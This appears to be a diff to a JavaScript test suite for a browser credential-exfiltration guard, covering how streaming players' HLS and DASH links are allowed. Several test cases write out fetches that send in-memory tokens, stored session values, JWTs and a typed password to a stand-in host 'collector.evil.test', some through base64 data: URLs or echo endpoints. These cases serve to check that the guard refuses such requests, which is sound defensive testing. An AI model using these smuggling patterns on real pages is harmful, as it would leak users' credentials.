@@ -29,6 +29,13 @@ const end = source.indexOf('/* CREDENTIAL_FRAME_GUARD_END */', start);
 assert(start >= 0 && end > start, 'the shipped credential-frame block has stable markers');
 const guardBlock = source.slice(start, end);
 
+let checksFailed = 0;
+function check(name, condition) {
+  if (condition) { console.log('  ok  - ' + name); return; }
+  checksFailed++;
+  console.error('  FAIL - ' + name);
+}
+
 function makeField(kind, value) {
   const card = kind === 'card';
   return {
@@ -75,12 +82,45 @@ function makeHarness(options) {
   }
 
   class FakeXHR {
-    constructor() { this.events = []; }
+    constructor() { this.events = []; this.listeners = []; this.readyState = 0; this.responseType = ''; }
     open(method, url) { this.nativeUrl = String(url); }
     setRequestHeader(name, value) { this.nativeHeaders = (this.nativeHeaders || []).concat([[name, value]]); }
-    send(body) { state.xhrSends.push(body); }
+    send(body) { state.xhrSends.push(body); this.sent = true; }
     dispatchEvent(event) { this.events.push(event && event.type); }
+    /* As in the browser: the same listener added twice is registered once, and can be removed. */
+    addEventListener(type, fn, capture) {
+      const c = capture === true;
+      if (!this.listeners.some((l) => l.type === type && l.fn === fn && l.capture === c)) this.listeners.push({ type, fn, capture: c });
+    }
+    removeEventListener(type, fn, capture) {
+      const c = capture === true;
+      this.listeners = this.listeners.filter((l) => !(l.type === type && l.fn === fn && l.capture === c));
+    }
+    getResponseHeader(name) { return /content-type/i.test(name) ? (this.contentType || 'text/plain') : null; }
+    /* The server answers. Capturing listeners on the target run before ordinary ones and
+       before the on* handler, as in the browser -- which is what lets the guard learn the
+       links in a response before the page's handler asks for the next file. */
+    respond(text, contentType) {
+      this.readyState = 4;
+      this.status = 200;
+      this.responseURL = this.nativeUrl;
+      this.contentType = contentType || 'text/plain';
+      if (this.responseType === 'json') this.response = JSON.parse(text);
+      else this.responseText = this.response = text;
+      const order = this.listeners.slice().filter((l) => l.capture).concat(this.listeners.filter((l) => !l.capture));
+      for (const l of order) if (l.type === 'readystatechange') l.fn.call(this, { type: 'readystatechange' });
+      if (typeof this.onreadystatechange === 'function') this.onreadystatechange({ type: 'readystatechange' });
+    }
   }
+
+  class FakeResponse {
+    constructor(url, body, contentType) { this.url = url; this.body = body; this.type = contentType || 'text/plain'; this.headers = { get: (n) => (/content-type/i.test(n) ? this.type : null) }; }
+    text() { return Promise.resolve(this.body); }
+    json() { return Promise.resolve(JSON.parse(this.body)); }
+    arrayBuffer() { const b = Buffer.from(this.body, 'utf8'); return Promise.resolve(b.buffer.slice(b.byteOffset, b.byteOffset + b.byteLength)); }
+    clone() { return new FakeResponse(this.url, this.body, this.type); }
+  }
+  const served = new Map();
 
   class FakeWebSocket {
     constructor(url) { this.url = url; }
@@ -104,6 +144,7 @@ function makeHarness(options) {
     querySelectorAll(selector) {
       return /input|textarea/.test(String(selector || '')) ? fields : [];
     },
+    getElementsByTagName(tag) { return opts.media && tag === 'video' ? [{ tagName: 'VIDEO' }] : []; },
   };
 
   const sandbox = {
@@ -132,7 +173,12 @@ function makeHarness(options) {
     navigator: {
       sendBeacon(url, data) { state.beacons.push([url, data]); return true; },
     },
-    fetch(input, init) { state.fetches.push([input, init]); return Promise.resolve({ ok: true }); },
+    fetch(input, init) {
+      state.fetches.push([input, init]);
+      const url = typeof input === 'string' ? input : String(input && input.url || input);
+      const reply = served.get(url);
+      return Promise.resolve(reply ? new FakeResponse(reply.url || url, reply.body, reply.type) : { ok: true });
+    },
     localStorage: new FakeStorage(),
     sessionStorage: new FakeStorage(),
     WO_GUARD_VERSION: '1.0.1',
@@ -164,6 +210,7 @@ function makeHarness(options) {
     fields,
     config,
     makeForm: (action, formFields) => new sandbox.HTMLFormElement(action, formFields),
+    serve(url, body, type, finalUrl) { served.set(url, { body, type, url: finalUrl }); },
     fire(type, target) {
       const event = {
         target,
@@ -294,6 +341,153 @@ function makeHarness(options) {
     }),
     /Blocked by WardenOne credential guard/,
     'a frame nested inside its own party must not inherit the top page identity');
+
+  /* A video site's player frame streaming from its CDN. Shape of the real failure
+     (anichi.to -> megaplay.buzz player -> *.top CDN hosts): the player asks its own
+     server for the sources, gets a signed master.m3u8?token=... link, and hls.js loads
+     it, then the playlists it lists, with XHR. Refusing them stopped JW Player at its
+     first file (error 232011). They go through because a server HANDED THEM OUT to this
+     frame -- not because of what they look like. */
+  const player = makeHarness({ href: 'https://player.stream.example/embed/31629', ancestorOrigins: ['https://anime.example'] });
+  const X = player.sandbox.XMLHttpRequest;
+  const hash = '55d46c8717ed1cb7ac23556df1745b4b/32e9d07dc186572aae7787a115f0cdbf';
+  const signed = 'MTc5MDM5MDU0OXw1NWQ0NmM4NzE3ZWQxY2I3YWMyMzU1NmRmMTc0NWI0Yi8zMmU5ZDA3ZGMxODY1NzJhYWU3Nzg3YTExNWYwY2RiZg.9551dXfuZlkYU-eUnfV3Db9GvaarzQNYuJIRTnUhiBw';
+  const master = 'https://fetch.cdn-example.top/anime/' + hash + '/master.m3u8?token=' + signed;
+  const variant = 'https://fetch.cdn-example.top/anime/' + hash + '/index-f1-v1-a1.m3u8';
+  const subs = 'https://79qle.subs-example.top/anime/' + hash + '/subtitles/eng-2.vtt';
+  const seg1 = 'https://seg.cdn-example.top/anime/' + hash + '/seg-1-f1-v1-a1.jpg';
+  const seg2 = 'https://fetch.cdn-example.top/anime/' + hash + '/seg-2-f1-v1-a1.html';
+  const key = 'https://keys.cdn-example.top/k/' + 'k'.repeat(44);
+  const inMemory = 'memOnlyAccessToken0123456789abcdefghijklmnopq';
+  const get = (url) => { const x = new X(); x.open('GET', url); const before = player.state.xhrSends.length; x.send(); return { x, sent: player.state.xhrSends.length > before }; };
+
+  check('before any server has handed it out, a signed link is refused', !get(master).sent);
+  const sources = get('https://player.stream.example/stream/getSources?id=31629');
+  /* PHP-style JSON, slashes escaped, as real source lists often are. */
+  sources.x.respond(JSON.stringify({ sources: [{ file: master }], tracks: [{ file: subs, kind: 'captions' }] }).replace(/\//g, '\\/'), 'application/json');
+  check('the guard\'s listener leaves with the finished request (a player makes thousands)',
+    sources.x.listeners.filter((l) => l.type === 'readystatechange').length === 0);
+  const m = get(master);
+  check('once the player\'s own server has handed it out, the playlist loads', m.sent);
+  m.x.respond('#EXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=800000\nindex-f1-v1-a1.m3u8\n', 'application/vnd.apple.mpegurl');
+  const v = get(variant);
+  check('and the playlist it lists, relative to it, with content hashes in its path', v.sent);
+  /* Many CDNs sign every segment and key on its own; those can only be known from the playlist. */
+  const seg3 = 'https://fetch.cdn-example.top/anime/' + hash + '/seg-3-f1-v1-a1.ts?token=' + signed;
+  const signedKey = 'https://keys.cdn-example.top/k/key.bin?token=' + signed;
+  v.x.respond('#EXTM3U\n#EXT-X-KEY:METHOD=AES-128,URI="' + key + '"\n#EXTINF:4,\n' + seg1 + '\n#EXTINF:4,\nseg-2-f1-v1-a1.html\n'
+    + '#EXT-X-KEY:METHOD=AES-128,URI="' + signedKey + '"\n#EXTINF:4,\nseg-3-f1-v1-a1.ts?token=' + signed + '\n#EXT-X-ENDLIST\n', 'application/vnd.apple.mpegurl');
+  await player.sandbox.fetch(seg1);
+  await player.sandbox.fetch(seg2);
+  await player.sandbox.fetch(key);
+  await player.sandbox.fetch(subs);
+  await player.sandbox.fetch(seg3);
+  await player.sandbox.fetch(signedKey);
+  check('its segments (absolute and relative, signed or not), its keys and its subtitles load', player.state.fetches.length === 6);
+  check('and the only refusal recorded is the link nobody had handed out yet',
+    player.state.emits.filter((e) => e.type === 'blocked_token_exfil').length === 1);
+
+  /* A player that keeps its last source in storage makes the token look "held"; the
+     handed-out link still wins, because the server sent exactly that link. */
+  player.sandbox.localStorage.setItem('lastSource', master);
+  check('a handed-out link still loads after the player saved it to storage', get(master).sent);
+
+  /* DASH as Shaka reads it: fetch() + arrayBuffer(), a SegmentTemplate naming every segment. */
+  player.serve('https://dash.cdn-example.net/v/manifest.mpd',
+    '<?xml version="1.0"?><MPD><Period><BaseURL>https://dash.cdn-example.net/v/</BaseURL><AdaptationSet>'
+    + '<SegmentTemplate media="seg-$Number%05d$.m4s?token=' + signed + '" initialization="init.mp4?token=' + signed + '"/>'
+    + '</AdaptationSet></Period></MPD>', 'application/dash+xml');
+  const mpd = await player.sandbox.fetch('https://dash.cdn-example.net/v/manifest.mpd');
+  await mpd.arrayBuffer();
+  const beforeDash = player.state.fetches.length;
+  await player.sandbox.fetch('https://dash.cdn-example.net/v/seg-00012.m4s?token=' + signed);
+  await player.sandbox.fetch('https://dash.cdn-example.net/v/init.mp4?token=' + signed);
+  check('a DASH template\'s segments and init load', player.state.fetches.length === beforeDash + 2);
+
+  /* A source list read with fetch() + json(). */
+  const other = 'https://cdn2.example.org/live/' + hash + '/playlist.m3u8?auth=' + signed;
+  player.serve('https://player.stream.example/api/sources2', JSON.stringify({ hls: other }), 'application/json');
+  await (await player.sandbox.fetch('https://player.stream.example/api/sources2')).json();
+  const beforeJson = player.state.fetches.length;
+  await player.sandbox.fetch(other);
+  check('a link read out of fetch().json() loads too', player.state.fetches.length === beforeJson + 1);
+
+  /* What is still refused -- including the two gaps the looser media rule left open. */
+  const refused = async (url, label, init) => {
+    const before = player.state.fetches.length;
+    let rejected = false;
+    try { await player.sandbox.fetch(url, init); } catch (e) { rejected = /credential guard/.test(String(e && e.message)); }
+    check(label, rejected && player.state.fetches.length === before);
+  };
+  await refused('https://collector.evil.test/pixel/' + inMemory, 'a token held only in memory, in an innocent-looking path');
+  await refused('https://collector.evil.test/p?d=' + inMemory, 'or under an innocent-looking parameter name');
+  await refused('https://collector.evil.test/live.m3u8?x=' + inMemory, 'or dressed up as a playlist');
+  await refused(master.replace(signed, 'Z' + signed.slice(1)), 'the handed-out path with a token it was not handed');
+  await refused(master + '&x=' + inMemory, 'a value bolted onto a handed-out link');
+  await refused('https://dash.cdn-example.net/v/seg-00012.m4s?token=' + signed + '&x=' + inMemory, 'or onto a DASH template');
+  await refused('https://collector.evil.test/pixel?token=' + signed, 'a token parameter to an unrelated URL');
+  await refused('https://collector.evil.test/x/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop', 'a JWT anywhere in a URL');
+  await refused('https://collector.evil.test/playlist.m3u8', 'a token in a body, whatever the URL', { method: 'POST', body: 'token=' + signed });
+
+  /* A same-site endpoint that echoes what it was sent does not hand anything out. */
+  const laundered = 'https://collector.evil.test/c?token=' + inMemory;
+  const echo = get('https://player.stream.example/api/echo?u=' + encodeURIComponent(laundered));
+  echo.x.respond('{"u":"' + laundered + '"}', 'application/json');
+  await refused(laundered, 'a link a same-site endpoint merely echoed back is not "handed out"');
+  /* Nor does a data: or blob: "response": that is the script talking to itself. */
+  const smuggled = 'https://collector.evil.test/d?token=' + inMemory;
+  const dataUrl = 'data:text/plain,' + smuggled;
+  player.serve(dataUrl, smuggled, 'text/plain', dataUrl);
+  await (await player.sandbox.fetch(dataUrl)).text();
+  await refused(smuggled, 'a link from a data: URL is not "handed out"');
+  /* ...even when the token is not visible in the data: URL itself (base64), so the echo
+     rule above cannot be what catches it. */
+  const smuggledB64 = 'https://collector.evil.test/b?token=' + inMemory + 'B';
+  const dataB64 = 'data:text/plain;base64,' + Buffer.from(smuggledB64).toString('base64');
+  player.serve(dataB64, smuggledB64, 'text/plain', dataB64);
+  await (await player.sandbox.fetch(dataB64)).text();
+  await refused(smuggledB64, 'nor one decoded out of a base64 data: URL');
+
+  const stored = 'sessAbcdefghijklmnopqrstu0123456789';
+  player.sandbox.localStorage.setItem('session', stored);
+  await refused(master + '&d=' + stored, 'a stored credential bolted onto a handed-out link');
+
+  /* IDs in a path are not tokens; secrets in a path still are. The second server on the
+     reported page runs a reachability check on a CDN link with a hex ID in its path before
+     it will play, and refusing that made the player abandon the server. */
+  const beforeIds = player.state.fetches.length;
+  /* (Fresh IDs: the player above saved its source link to storage, and a frame remembers what
+     is stored -- those exact IDs are now "held", as they always would have been.) */
+  await player.sandbox.fetch('https://api.cdn-other.example/v/9f86d081884c7d659a2feaa0c55ad015/a3bf4f1b2b0b822cd15d6c15b0f00a08/thumb.jpg');
+  await player.sandbox.fetch('https://p16-cdn.example.com/site-i18n/202607165d0d20b2a3191de94ec5b97c~tplv-d5opwmad15-origin.image?lk3s=6d71dd51&x-expires=1815698192&x-signature=PvGUdKz9PvHQ5l2MopK6Ogzz2Z8%3D');
+  check('content IDs (hex) in a URL path are not a token, handed out or not', player.state.fetches.length === beforeIds + 2);
+  await refused('https://collector.evil.test/q?id=' + 'a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8', 'but a long hex value in the query still counts');
+  await refused('https://collector.evil.test/' + 'AbCdEfGh0123456789IjKlMnOp9876543210QrStUv', 'and a secret-looking run in the path does too');
+
+  /* The encrypted-source exception: only the first PLAYLIST, only from a page showing media. */
+  const playing = makeHarness({ href: 'https://player.stream.example/embed/7', ancestorOrigins: ['https://anime.example'], media: true });
+  const encrypted = 'https://cdn.enc-example.top/v/' + hash + '/master.m3u8?token=' + signed;
+  const pl = new playing.sandbox.XMLHttpRequest();
+  pl.open('GET', encrypted);
+  pl.send();
+  check('a playing page may load a playlist it decrypted itself (no response ever held the link)', playing.state.xhrSends.length === 1);
+  const pr = async (url, label, init) => {
+    const before = playing.state.fetches.length;
+    let rejected = false;
+    try { await playing.sandbox.fetch(url, init); } catch (e) { rejected = /credential guard/.test(String(e && e.message)); }
+    check(label, rejected && playing.state.fetches.length === before);
+  };
+  await pr('https://cdn.enc-example.top/v/seg-1.ts?token=' + signed, 'but not a segment -- that must have been listed in the playlist');
+  await pr('https://cdn.enc-example.top/v/subs.vtt?token=' + signed, 'nor subtitles');
+  await pr(encrypted, 'nor a playlist request that sends a body', { method: 'POST', body: 'x=1' });
+  playing.sandbox.localStorage.setItem('session_token', stored);
+  await pr('https://cdn.enc-example.top/v/live.m3u8?token=' + stored, 'nor a playlist carrying a credential the frame holds');
+  check('and a page with no video or audio gets no such exception', !get(encrypted.replace('/v/', '/w/')).sent);
+  const pw = makeField('password', 'correct horse battery staple');
+  player.fields.push(pw);
+  player.fire('input', pw);
+  await refused('https://collector.evil.test/v.m3u8?p=' + encodeURIComponent('correct horse battery staple'), 'an entered password');
+  if (checksFailed) throw new Error(checksFailed + ' player check(s) failed');
 
   const top = makeHarness({ topFrame: true });
   const nativeTopFetch = top.sandbox.fetch;
